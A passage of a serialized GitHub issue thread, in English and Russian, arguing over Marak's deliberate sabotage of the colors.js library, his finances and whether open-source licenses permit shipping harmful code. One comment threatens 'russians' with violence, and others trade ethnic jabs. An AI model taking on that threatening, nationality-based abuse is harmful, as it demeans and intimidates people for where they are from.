\u0437\u0430\u043d\u0438\u043c\u0430\u0442\u044c\u0441\u044f \u043d\u0435 \u0434\u0430\u0432\u0430\u043b.'}, 'com_61': {'author': 'okyanusoz', 'datetime': '01\/22\/2022, 06:22:30', 'body': '@cronlabspl Marak should stop this money disaster, not this discussion'}, 'com_62': {'author': 'hello-smile6', 'datetime': '01\/22\/2022, 06:24:15', 'body': '> @cronlabspl Marak should stop this money disaster, not this discussion\\r\\n\\r\\nHere!\\r\\n![img](https:\/\/assets.scratch.mit.edu\/045e55e80b60ddd40d5a1a2a1bb3403a.png)'}, 'com_63': {'author': 'WhiteNervosa', 'datetime': '01\/23\/2022, 07:38:27', 'body': \"Four months ago, Marak [dropped over $10,000 on NFTs](https:\/\/opensea.io\/Marak?search[chains][0]=ETHEREUM&search[eventTypes][0]=AUCTION_SUCCESSFUL&tab=activity). No matter your opinion of NFTs, if you have that amount of money as disposable income then you're doing alright.\\r\\n\\r\\nHe could have just archived this if it was the feeling that he was giving labor for nothing in return or even tried the [sponsor feature](https:\/\/github.com\/sponsors), earlier. Earlier because they [currently have 47 sponsors](https:\/\/github.com\/sponsors\/Marak#sponsors).\\r\\n\\r\\nThis is not about money. Worse even, what do those 47 people now think about **sponsoring to support others?**\\r\\n\\r\\nShort sighted, misguided, and harmful. _Bravo_ \ud83c\udf89\"}, 'com_64': {'author': 'G2G2G2G', 'datetime': '01\/23\/2022, 09:33:54', 'body': '@hello-smile6 what does \"syeal your data\" mean?'}, 'com_65': {'author': 'nacknime-official', 'datetime': '01\/23\/2022, 09:46:25', 'body': '@teror4uks \u0430 \u0442\u0430\u043c \u0447\u0442\u043e-\u0442\u043e \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u043e \u043f\u0440\u043e \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e? \u043f\u0443\u0441\u0442\u044c \u0434\u0435\u043b\u0430\u0435\u0442 \u0441 \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u0435\u043c \u0447\u0442\u043e \u0445\u043e\u0447\u0435\u0442, \u043e\u043d \u043d\u0438\u043a\u043e\u043c\u0443 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d'}, 'com_66': {'author': 'teror4uks', 'datetime': '01\/23\/2022, 13:49:51', 'body': '@nacknime-official  \u0435\u0449\u0451 \u043a\u0430\u043a \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u043e, \u0441\u043f\u0435\u0446\u0438\u0430\u043b\u044c\u043d\u043e \u043d\u0430\u043f\u0438\u0441\u0430\u0442\u044c \u043a\u043e\u0434 \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0431\u0443\u0434\u0435\u0442 \u043a\u0440\u0430\u0448\u0438\u0442\u0441\u044f \u0438 \u043f\u043e\u0442\u043e\u043c \u0435\u0433\u043e \u0437\u0430\u0440\u0435\u043b\u0438\u0437\u0438\u0442\u044c \u0438 \u0435\u0441\u0442\u044c \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e.'}, 'com_67': {'author': 'nacknime-official', 'datetime': '01\/23\/2022, 16:55:02', 'body': '@teror4uks \u0442\u043a\u043d\u0438 \u043d\u043e\u0441\u043e\u043c, \u0447\u0442\u043e \u0442\u0430\u043c \u0442\u0430\u043a\u043e\u0435 \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u043e'}, 'com_68': {'author': 'hello-smile6', 'datetime': '01\/23\/2022, 18:15:10', 'body': '> @hello-smile6 what does \"syeal your data\" mean?\\r\\n\\r\\nNot my art, ask the creator.'}, 'com_69': {'author': 'teror4uks', 'datetime': '01\/23\/2022, 19:52:34', 'body': '@nacknime-official  https:\/\/github.com\/Marak\/colors.js\/commit\/5d2d242f656103ac38086d6b26433a09f1c38c75'}, 'com_70': {'author': 'nacknime-official', 'datetime': '01\/24\/2022, 05:43:12', 'body': '@teror4uks \u0438\u043c\u0435\u044e \u0432\u0432\u0438\u0434\u0443 \u0442\u043a\u043d\u0438 \u043d\u043e\u0441\u043e\u043c \u0432 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u044e, \u0433\u0434\u0435 \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u043e \u043f\u0440\u043e \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e'}, 'com_71': {'author': 'teror4uks', 'datetime': '01\/24\/2022, 09:30:35', 'body': '@nacknime-official \u043b\u043e\u043b, \u043d\u0443 \u0441 \u0442\u043e\u0431\u043e\u0439 \u0432 \u043f\u0440\u0438\u043d\u0446\u0438\u043f\u0435 \u0431\u0435\u0441\u043f\u043e\u043b\u0435\u0437\u043d\u043e \u0440\u0430\u0437\u0433\u043e\u0432\u0430\u0440\u0438\u0432\u0430\u0442\u044c \u0435\u0441\u043b\u0438 \u0442\u044b \u043d\u0435 \u0432\u0438\u0434\u0438\u0448\u044c \u0442\u0443\u0442 \u043f\u0440\u043e\u0431\u043b\u0435\u043c, \u0435\u0434\u0438\u043d\u0441\u0442\u0432\u0435\u043d\u043d\u043e\u0435 \u0440\u0430\u0434\u0443\u0435\u0442 \u0447\u0442\u043e \"\u043f\u0440\u0430\u0432\u0434\u043e\u0440\u0443\u0431\u044b\" \u0432\u0440\u043e\u0434\u0435 \u0442\u0435\u0431\u044f \u0437\u0434\u0435\u0441\u044c \u0432 \u043c\u0435\u043d\u044c\u0448\u0438\u043d\u0441\u0442\u0432\u0435, \u0438 \u0432 \u043e\u0441\u043d\u043e\u0432\u043d\u043e\u043c \u043b\u044e\u0434\u0438 \u043f\u043e\u043d\u0438\u043c\u0430\u044e\u0442 \u0447\u0442\u043e \u0442\u0430\u043a \u0434\u0435\u043b\u0430\u0442\u044c \u043a\u0430\u043a \u043c\u0438\u043d\u0438\u043c\u0443\u043c \u043d\u0435 \u043f\u0440\u0438\u043b\u0438\u0447\u043d\u043e \u0432 \u0446\u0438\u0432\u0438\u043b\u0438\u0437\u043e\u0432\u0430\u043d\u043d\u043e\u043c \u043e\u0431\u0449\u0435\u0441\u0442\u0432\u0435.'}, 'com_72': {'author': 'wtlgo', 'datetime': '01\/26\/2022, 10:04:34', 'body': '@teror4uks \u0442\u044b, \u043d\u0430\u0432\u0435\u0440\u043d\u043e\u0435, \u043d\u0435 \u0441\u043e\u0432\u0441\u0435\u043c \u043f\u043e\u043d\u044f\u043b \u0441\u0443\u0442\u044c \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0439. \u041b\u0438\u0446\u0435\u043d\u0437\u0438\u044f - \u044d\u0442\u043e \u0443\u0441\u043b\u043e\u0432\u0438\u044f, \u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u0430\u0432\u0442\u043e\u0440 \u0441\u043e\u0444\u0442\u0430 \u0434\u0435\u043b\u0438\u0442\u0441\u044f \u0441\u0432\u043e\u0435\u0439 \u0440\u0430\u0431\u043e\u0442\u043e\u0439 \u0441 \u0434\u0440\u0443\u0433\u0438\u043c\u0438 \u043b\u044e\u0434\u044c\u043c\u0438, \u0438 \u043b\u044e\u0431\u043e\u0439, \u043a\u0442\u043e \u0432 \u0438\u0442\u043e\u0433\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 \u044d\u0442\u0443 \u0440\u0430\u0431\u043e\u0442\u0443, \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438 \u0441\u043e\u0433\u043b\u0430\u0448\u0430\u0435\u0442\u0441\u044f \u0441 \u044d\u0442\u0438\u043c\u0438 \u0441\u0430\u043c\u044b\u043c\u0438 \u0443\u0441\u043b\u043e\u0432\u0438\u044f\u043c\u0438. \u0410 \u0432 \u0443\u0441\u043b\u043e\u0432\u0438\u044f\u0445 \u044d\u0442\u0438\u0445 \u0441\u043a\u0430\u0437\u0430\u043d\u043e, \u0447\u0442\u043e \u0435\u0441\u043b\u0438 \u0442\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0448\u044c \u044d\u0442\u043e\u0442 \u0441\u043e\u0444\u0442, \u0430\u0432\u0442\u043e\u0440 \u0441\u043d\u0438\u043c\u0430\u0435\u0442 \u0441 \u0441\u0435\u0431\u044f \u043b\u044e\u0431\u0443\u044e \u043e\u0442\u0432\u0435\u0442\u0441\u0432\u0435\u043d\u043d\u043e\u0441\u0442\u044c \u0437\u0430 \u043a\u0430\u043a\u043e\u0439-\u043b\u0438\u0431\u043e \u0432\u0440\u0435\u0434, \u0447\u0442\u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u043c\u043e\u0436\u0435\u0442 \u0442\u0435\u0431\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0438\u0442\u044c. \u0422\u0430\u043a \u0447\u0442\u043e \u0441 \u043b\u0435\u0433\u0430\u043b\u044c\u043d\u043e\u0439 \u0442\u043e\u0447\u043a\u0438 \u0437\u0440\u0435\u043d\u0438\u044f \u0430\u0432\u0442\u043e\u0440 \u043d\u0438\u0447\u0435\u043c\u0443 \u043d\u0438\u043a\u043e\u043c\u0443 \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d, \u0438 \u043c\u043e\u0436\u0435\u0442 \u043a\u043e\u043c\u0438\u0442\u0438\u0442\u044c \u0432 \u0441\u0432\u043e\u0439 \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u0439 \u0432\u0441\u0435, \u0447\u0442\u043e \u0435\u043c\u0443 \u0437\u0430\u0445\u043e\u0447\u0435\u0442\u0441\u044f, \u0431\u0443\u0434\u044c \u0442\u043e \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e \u0438\u043b\u0438 \u043d\u0435 \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e. \u0415\u0441\u043b\u0438 \u0442\u0435\u0431\u0435 \u0442\u0430\u043a\u0438\u0435 \u0443\u0441\u043b\u043e\u0432\u0438\u044f \u043d\u0435 \u043d\u0440\u0430\u0432\u0438\u0442\u0441\u044f, \u0442\u044b \u043f\u0440\u043e\u0441\u0442\u043e \u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0442\u043a\u0430\u0437\u0430\u0442\u044c\u0441\u044f \u043e\u0442 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u0441\u043e\u0444\u0442\u0430.'}, 'com_73': {'author': 'dmitrykurmanov', 'datetime': '01\/26\/2022, 10:17:20', 'body': '> @teror4uks \u0442\u044b, \u043d\u0430\u0432\u0435\u0440\u043d\u043e\u0435, \u043d\u0435 \u0441\u043e\u0432\u0441\u0435\u043c \u043f\u043e\u043d\u044f\u043b \u0441\u0443\u0442\u044c \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0439. \u041b\u0438\u0446\u0435\u043d\u0437\u0438\u044f - \u044d\u0442\u043e \u0443\u0441\u043b\u043e\u0432\u0438\u044f, \u043d\u0430 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u0430\u0432\u0442\u043e\u0440 \u0441\u043e\u0444\u0442\u0430 \u0434\u0435\u043b\u0438\u0442\u0441\u044f \u0441\u0432\u043e\u0435\u0439 \u0440\u0430\u0431\u043e\u0442\u043e\u0439 \u0441 \u0434\u0440\u0443\u0433\u0438\u043c\u0438 \u043b\u044e\u0434\u044c\u043c\u0438, \u0438 \u043b\u044e\u0431\u043e\u0439, \u043a\u0442\u043e \u0432 \u0438\u0442\u043e\u0433\u0435 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0442 \u044d\u0442\u0443 \u0440\u0430\u0431\u043e\u0442\u0443, \u0430\u0432\u0442\u043e\u043c\u0430\u0442\u0438\u0447\u0435\u0441\u043a\u0438 \u0441\u043e\u0433\u043b\u0430\u0448\u0430\u0435\u0442\u0441\u044f \u0441 \u044d\u0442\u0438\u043c\u0438 \u0441\u0430\u043c\u044b\u043c\u0438 \u0443\u0441\u043b\u043e\u0432\u0438\u044f\u043c\u0438. \u0410 \u0432 \u0443\u0441\u043b\u043e\u0432\u0438\u044f\u0445 \u044d\u0442\u0438\u0445 \u0441\u043a\u0430\u0437\u0430\u043d\u043e, \u0447\u0442\u043e \u0435\u0441\u043b\u0438 \u0442\u044b \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u0443\u0435\u0448\u044c \u044d\u0442\u043e\u0442 \u0441\u043e\u0444\u0442, \u0430\u0432\u0442\u043e\u0440 \u0441\u043d\u0438\u043c\u0430\u0435\u0442 \u0441 \u0441\u0435\u0431\u044f \u043b\u044e\u0431\u0443\u044e \u043e\u0442\u0432\u0435\u0442\u0441\u0432\u0435\u043d\u043d\u043e\u0441\u0442\u044c \u0437\u0430 \u043a\u0430\u043a\u043e\u0439-\u043b\u0438\u0431\u043e \u0432\u0440\u0435\u0434, \u0447\u0442\u043e \u043f\u0440\u043e\u0433\u0440\u0430\u043c\u043c\u0430 \u043c\u043e\u0436\u0435\u0442 \u0442\u0435\u0431\u0435 \u043f\u0440\u0438\u0447\u0438\u043d\u0438\u0442\u044c. \u0422\u0430\u043a \u0447\u0442\u043e \u0441 \u043b\u0435\u0433\u0430\u043b\u044c\u043d\u043e\u0439 \u0442\u043e\u0447\u043a\u0438 \u0437\u0440\u0435\u043d\u0438\u044f \u0430\u0432\u0442\u043e\u0440 \u043d\u0438\u0447\u0435\u043c\u0443 \u043d\u0438\u043a\u043e\u043c\u0443 \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d, \u0438 \u043c\u043e\u0436\u0435\u0442 \u043a\u043e\u043c\u0438\u0442\u0438\u0442\u044c \u0432 \u0441\u0432\u043e\u0439 \u0440\u0435\u043f\u043e\u0437\u0438\u0442\u043e\u0440\u0438\u0439 \u0432\u0441\u0435, \u0447\u0442\u043e \u0435\u043c\u0443 \u0437\u0430\u0445\u043e\u0447\u0435\u0442\u0441\u044f, \u0431\u0443\u0434\u044c \u0442\u043e \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e \u0438\u043b\u0438 \u043d\u0435 \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e. \u0415\u0441\u043b\u0438 \u0442\u0435\u0431\u0435 \u0442\u0430\u043a\u0438\u0435 \u0443\u0441\u043b\u043e\u0432\u0438\u044f \u043d\u0435 \u043d\u0440\u0430\u0432\u0438\u0442\u0441\u044f, \u0442\u044b \u043f\u0440\u043e\u0441\u0442\u043e \u0434\u043e\u043b\u0436\u0435\u043d \u043e\u0442\u043a\u0430\u0437\u0430\u0442\u044c\u0441\u044f \u043e\u0442 \u0438\u0441\u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u0441\u043e\u0444\u0442\u0430.\\r\\n\\r\\nhttps:\/\/habr.com\/en\/news\/t\/599865\/#comment_23921173'}, 'com_74': {'author': 'wtlgo', 'datetime': '01\/26\/2022, 10:47:40', 'body': '@dmitrykurmanov \u044f \u043e\u0442\u0432\u0435\u0447\u0430\u043b \u043d\u0430 \u0432\u043f\u043e\u043b\u043d\u0435 \u043a\u043e\u043d\u043a\u0440\u0435\u0442\u043d\u043e\u0435 \u0443\u0442\u0432\u0435\u0440\u0436\u0434\u0435\u043d\u0438\u0435 \u0432\u044b\u0448\u0435:\\r\\n\\r\\n> @quenbyako \u0441\u0440\u0430\u0437\u0443 \u0432\u0438\u0434\u043d\u043e \u0440\u0443\u0441\u0441\u043a\u043e\u0433\u043e \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u043c\u0435\u0435\u0442 \u0447\u0438\u0442\u0430\u0442\u044c \u043e\u043f\u0435\u043d\u0441\u043e\u0440\u0441\u043d\u044b\u0435 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438 \u043d\u0430 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u043e\u043c \u0438\u0437 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u043a\u0430\u043a \u0431\u044b \u0447\u0451\u0442\u043a\u043e \u0432\u044b\u0442\u0435\u043a\u0430\u0435\u0442, \u0447\u0442\u043e \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d, \u043d\u0435 \u0445\u043e\u0447\u0435\u0448\u044c \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0442\u044c \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0439, \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e\u043c \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043f\u0440\u0430\u0432\u0430 \u0437\u0430\u043d\u0438\u043c\u0430\u0442\u044c\u0441\u044f \u043d\u0435 \u0434\u0430\u0432\u0430\u043b.\\r\\n\\r\\n\u041d\u0430\u0441\u0447\u0435\u0442 \u044d\u0442\u0438\u0447\u043d\u043e\u0441\u0442\u0438 \u0434\u0430\u043d\u043d\u043e\u0433\u043e \u043f\u043e\u0441\u0442\u0443\u043f\u043a\u0430 \u044f \u0441\u0443\u0434\u0438\u0442\u044c \u043d\u0435 \u0431\u0435\u0440\u0443\u0441\u044c, \u043d\u043e \u0441\u0443\u0442\u0438 \u0442\u043e\u0433\u043e, \u0447\u0442\u043e \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u044f \u043d\u0430\u043f\u0440\u0430\u0432\u043b\u0435\u043d\u0430 \u043d\u0430 \u043e\u0433\u0440\u0430\u043d\u0438\u0447\u0435\u043d\u0438\u0435 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044f, \u0430 \u043d\u0435 \u0430\u0432\u0442\u043e\u0440\u0430, \u044d\u0442\u043e \u043d\u0435 \u043c\u0435\u043d\u044f\u0435\u0442.'}, 'com_75': {'author': 'G2G2G2G', 'datetime': '01\/26\/2022, 15:25:31', 'body': 'yo russians, shut the fuck up before I meet up with you in ukraine and make you'}, 'com_76': {'author': 'wtlgo', 'datetime': '01\/26\/2022, 15:45:14', 'body': '> yo russians, shut the fuck up before I meet up with you in ukraine and make you\\r\\n\\r\\nAre you aware that almost half of Ukrainian people also use Russian as their primary language? How do you know that we are Russians and not someone else?'}, 'com_77': {'author': 'teror4uks', 'datetime': '01\/26\/2022, 15:55:16', 'body': '@wtlgo \u043d\u0443 \u044f \u043a\u0430\u043a \u0431\u044b \u0432 \u0441\u043e\u043e\u0431\u0449\u0435\u043d\u0438\u0438 \u043d\u0435 \u0443\u0442\u043e\u0447\u043d\u0438\u043b \u043a\u0430\u043a\u043e\u0435 \u043f\u0440\u0430\u0432\u043e \u043e\u043d \u043d\u0435 \u0438\u043c\u0435\u0435\u0442 \u0434\u0435-\u044e\u0440\u0435 \u0438\u043b\u0438 \u0434\u0435-\u0444\u0430\u043a\u0442\u043e :) \u0412 \u043e\u0431\u0449\u0435\u043c \u043f\u0443\u0441\u0442\u044c \u0438 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u044f \u044d\u0442\u043e \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0435\u0442 \u044f \u0441\u0447\u0438\u0442\u0430\u044e \u044d\u0442\u043e \u043a\u0430\u043a \u043c\u0438\u043d\u0438\u043c\u0443\u043c \u043d\u0435 \u044d\u0442\u0438\u0447\u043d\u043e, \u0432\u0441\u0451 \u0436\u0435 \u043c\u043e\u0440\u0430\u043b\u044c \u0438 \u044d\u0442\u0438\u043a\u0430 \u043d\u0430\u0441 \u0438 \u0434\u0435\u043b\u0430\u0435\u0442 \u043b\u044e\u0434\u044c\u043c\u0438, \u0430 \u043d\u0435 \u0442\u043e\u043b\u044c\u043a\u043e \u0433\u043e\u0440\u0441\u0442\u043a\u0430 \u0437\u0430\u043a\u043e\u043d\u043e\u0432.'}, 'com_78': {'author': 'wtlgo', 'datetime': '01\/27\/2022, 10:11:45', 'body': '@teror4uks \u043e\u043f\u044f\u0442\u044c \u0442\u0430\u043a\u0438, \u044f \u043e\u0442\u0432\u0435\u0447\u0430\u043b \u043f\u0440\u043e \u0442\u0432\u043e\u0439 \u0440\u0430\u0441\u0441\u043a\u0430\u0437 \u043e \u0442\u043e\u043c, \u0447\u0442\u043e \"\u0440\u0443\u0441\u0441\u043a\u0438\u0435 \u043b\u044e\u0434\u0438 \u043d\u0435 \u0443\u043c\u0435\u044e\u0442 \u0447\u0438\u0442\u0430\u0442\u044c \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438\". \u042d\u0442\u0438\u0447\u043d\u043e\u0441\u0442\u044c \u043f\u043e\u0441\u0442\u0443\u043f\u043a\u0430 \u0430\u0432\u0442\u043e\u0440\u0430 \u044f \u0441\u0443\u0434\u0438\u0442\u044c \u043d\u0435 \u0431\u0435\u0440\u0443\u0441\u044c.'}, 'com_79': {'author': 'teror4uks', 'datetime': '01\/27\/2022, 12:24:45', 'body': '@wtlgo \u0441\u0447\u0438\u0442\u0430\u044e \u0447\u0442\u043e \u0434\u0438\u0441\u043a\u0443\u0441\u0441 \u0441\u0435\u0431\u044f \u0438\u0441\u0447\u0435\u0440\u043f\u0430\u043b, \u0442\u044b \u0432\u044b\u0434\u0435\u0440\u043d\u0443\u043b \u043f\u043e\u043b\u043e\u0432\u0438\u043d\u0443 \u0444\u0440\u0430\u0437\u044b \u0438\u0437 \u043a\u043e\u043d\u0442\u0435\u043a\u0441\u0442\u0430 \u043a\u043e\u0442\u043e\u0440\u0430\u044f \u043f\u0440\u0435\u0434\u043d\u0430\u0437\u043d\u0430\u0447\u0430\u043b\u0430\u0441\u044c \u0434\u0440\u0443\u0433\u043e\u043c\u0443 \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0443 \u0438 \u043f\u044b\u0442\u0430\u0435\u0448\u044c\u0441\u044f \u0447\u0442\u043e \u0442\u043e \u043c\u043d\u0435 \u0434\u043e\u043a\u0430\u0437\u0430\u0442\u044c \u043d\u0435 \u043f\u043e\u043d\u044f\u0442\u043d\u043e \u0447\u0442\u043e, \u043f\u0440\u0435\u0434\u043b\u0430\u0433\u0430\u044e \u043e\u0441\u0442\u0430\u043d\u043e\u0432\u0438\u0442\u044c\u0441\u044f \u0438 \u0437\u0430\u043a\u0440\u044b\u0442\u044c \u0442\u0435\u043c\u0443'}, 'com_80': {'author': 'wtlgo', 'datetime': '01\/27\/2022, 12:40:04', 'body': '@teror4uks \u0447\u0442\u043e-\u0447\u0442\u043e \u044f \u0432\u044b\u0434\u0435\u0440\u043d\u0443\u043b? \u0414\u0430\u0432\u0430\u0439 \u043f\u043e \u043f\u043e\u0440\u044f\u0434\u043a\u0443. \u0412\u043e\u0442 \u0432\u0441\u044f \u0446\u0438\u0442\u0430\u0442\u0430.\\r\\n\\r\\n> @quenbyako \u0441\u0440\u0430\u0437\u0443 \u0432\u0438\u0434\u043d\u043e \u0440\u0443\u0441\u0441\u043a\u043e\u0433\u043e \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u043c\u0435\u0435\u0442 \u0447\u0438\u0442\u0430\u0442\u044c \u043e\u043f\u0435\u043d\u0441\u043e\u0440\u0441\u043d\u044b\u0435 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438 \u043d\u0430 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u043e\u043c \u0438\u0437 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u043a\u0430\u043a \u0431\u044b \u0447\u0451\u0442\u043a\u043e \u0432\u044b\u0442\u0435\u043a\u0430\u0435\u0442, \u0447\u0442\u043e \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d, \u043d\u0435 \u0445\u043e\u0447\u0435\u0448\u044c \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0442\u044c \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0439, \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e\u043c \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043f\u0440\u0430\u0432\u0430 \u0437\u0430\u043d\u0438\u043c\u0430\u0442\u044c\u0441\u044f \u043d\u0435 \u0434\u0430\u0432\u0430\u043b.\\r\\n\\r\\n\u041d\u0443 \u0434\u0430\u0432\u0430\u0439 \u0440\u0430\u0437\u0431\u0435\u0440\u0435\u043c \u043f\u043e \u0447\u0430\u0441\u0442\u044f\u043c, \u0442\u043e\u0431\u043e\u044e \u043d\u0430\u043f\u0438\u0441\u0430\u043d\u043d\u043e\u0435\\r\\n\\r\\n> \u0441\u0440\u0430\u0437\u0443 \u0432\u0438\u0434\u043d\u043e \u0440\u0443\u0441\u0441\u043a\u043e\u0433\u043e \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u043d\u0435 \u0443\u043c\u0435\u0435\u0442 \u0447\u0438\u0442\u0430\u0442\u044c \u043e\u043f\u0435\u043d\u0441\u043e\u0440\u0441\u043d\u044b\u0435 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438 \u043d\u0430 \u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u043e\u043c\\r\\n\\r\\n\u0421\u043e\u043c\u043d\u0438\u0442\u0435\u043b\u044c\u043d\u044b\u0439 \u0434\u043e\u0432\u043e\u0434 \u043e\u0442 \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u0430, \u043a\u043e\u0442\u043e\u0440\u044b\u0439 \u0441\u0430\u043c \u043d\u0435 \u0441\u0443\u043c\u0435\u043b \u043f\u0440\u043e\u0447\u0435\u0441\u0442\u044c \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u044e \u0438 \u043f\u043e\u043d\u044f\u0442\u044c, \u043e \u0447\u0435\u043c \u043e\u043d\u0430. \u041d\u043e \u043f\u0440\u043e\u0434\u043e\u043b\u0436\u0438\u043c.\\r\\n\\r\\n> \u0438\u0437 \u043a\u043e\u0442\u043e\u0440\u044b\u0445 \u043a\u0430\u043a \u0431\u044b \u0447\u0451\u0442\u043a\u043e \u0432\u044b\u0442\u0435\u043a\u0430\u0435\u0442, \u0447\u0442\u043e \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d, \u043d\u0435 \u0445\u043e\u0447\u0435\u0448\u044c \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0442\u044c \u043d\u0435 \u043f\u043e\u0434\u0434\u0435\u0440\u0436\u0438\u0432\u0430\u0439, \u0432\u0440\u0435\u0434\u0438\u0442\u0435\u043b\u044c\u0441\u0442\u0432\u043e\u043c \u043d\u0438\u043a\u0442\u043e \u0442\u0435\u0431\u0435 \u043f\u0440\u0430\u0432\u0430 \u0437\u0430\u043d\u0438\u043c\u0430\u0442\u044c\u0441\u044f \u043d\u0435 \u0434\u0430\u0432\u0430\u043b.\\r\\n\\r\\n\u0418\u0437 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438 \u0447\u0435\u0442\u043a\u043e \u0432\u044b\u0442\u0435\u043a\u0430\u0435\u0442 \u043d\u0435 \u044d\u0442\u043e. \u0415\u0441\u043b\u0438 \u0431\u044b \u0442\u044b \u0440\u0435\u0430\u043b\u044c\u043d\u043e \u0431\u044b\u043b \u043d\u0435 \u0440\u0443\u0441\u0441\u043a\u0438\u043c \u0447\u0435\u043b\u043e\u0432\u0435\u043a\u043e\u043c \u0438\u043b\u0438 \u0443\u043c\u0435\u043b \u0447\u0438\u0442\u0430\u0442\u044c \u043f\u043e-\u0430\u043d\u0433\u043b\u0438\u0439\u0441\u043a\u0438, \u0442\u043e \u0443\u0432\u0438\u0434\u0435\u043b \u0431\u044b, \u0447\u0442\u043e \u0438\u0437 \u043b\u0438\u0446\u0435\u043d\u0437\u0438\u0438 \u0447\u0435\u0442\u043a\u043e \u0432\u044b\u0442\u0435\u043a\u0430\u0435\u0442, \u0447\u0442\u043e \u044d\u0442\u043e \u0430\u0432\u0442\u043e\u0440 \u043d\u0438\u0447\u0435\u0433\u043e \u043d\u0435 \u0434\u043e\u043b\u0436\u0435\u043d \u043a\u043e\u043d\u0435\u0447\u043d\u043e\u043c\u0443 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044e, \u0447\u0442\u043e \u044d\u0442\u043e \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u0442\u0435\u043b\u044c \u0438\u043c\u0435\u0435\u0442 \u043f\u0440\u0430\u0432\u043e \u043e\u0442\u043a\u0430\u0437\u0430\u0442\u044c\u0441\u044f \u043e\u0442 \u043f\u043e\u043b\u044c\u0437\u043e\u0432\u0430\u043d\u0438\u044f 